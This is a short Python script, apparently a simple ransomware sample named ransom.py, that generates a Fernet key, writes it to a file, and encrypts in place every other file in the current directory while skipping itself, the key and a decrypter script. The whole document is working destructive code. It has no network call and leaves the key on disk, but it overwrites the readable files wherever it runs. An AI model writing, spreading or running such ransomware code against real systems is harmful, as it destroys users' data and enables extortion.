import os
from cryptography.fernet import Fernet

fileList = list()


def createKey():
    key = Fernet.generate_key()

    with open("generatedKey.key", "wb") as generatedKey:
        generatedKey.write(key)
    return key


def encryptedKey(key):
    for file in fileList:
        with open(file, "rb") as theFile:
            contents = theFile.read()
        contentsEncrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as theFile:
            theFile.write(contentsEncrypted)


def appendTheList():
    for file in os.listdir():
        if file == "ransom.py" or file == "generatedKey.key" or file == "ransomdecrypter.py":
            continue
        if os.path.isfile(file):
            fileList.append(file)


appendTheList()

newKey = createKey()

for file in fileList:
    print(f"Defined files {file} encrypted.")

encryptedKey(newKey)
